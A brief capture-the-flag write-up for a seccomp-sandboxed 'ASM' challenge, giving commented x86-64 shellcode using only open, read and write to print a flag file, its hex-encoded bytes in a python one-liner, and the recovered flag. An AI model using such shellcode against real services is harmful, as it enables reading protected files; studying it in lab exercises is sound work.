### ASM 

the binary has been sandboxed using seccomp , we have to get flag using only  open , read , write syscall

```
; open(rdi=*filename,rsi=0['r'])  rax=2

xor rax, rax
add al, 2
mov rdi,0x41414074
xor rsi, rsi 
syscall

; read(rdi=rax=fd,rsi= mapped area,rdx=count)  rax=0

mov rdi,rax
mov rsi,0x414143e8
xor rax,rax
mov rdx,0xf0
syscall

; write(rdi=1,rsi=buf,rdx=count) rax=1

xor rdi, rdi
add rdi,1
xor rax,rax
add rax,1
mov rsi,0x414143e8
mov rdx,0xf0
syscall

```

 python -c 'print "\x48\x31\xC0\x04\x02\x48\xC7\xC7\x74\x40\x41\x41\x48\x31\xF6\x0F\x05\x48\x89\xC7\x48\xC7\xC6\xE8\x43\x41\x41\x48\x31\xC0\x48\xC7\xC2\xF0\x00\x00\x00\x0F\x05\x48\x31\xFF\x48\x83\xC7\x01\x48\x31\xC0\x48\x83\xC0\x01\x48\xC7\xC6\xE8\x43\x41\x41\x48\xC7\xC2\xF0\x00\x00\x00\x0F\x05"+"\n"+"flag[Truncated]\x00\x00"' 

##### flag :  Mak1ng_shelLcodE_i5_veRy_eaSy

[Refer here for assembling](https://defuse.ca/online-x86-assembler.htm#disassembly)

[Syscall table](http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)


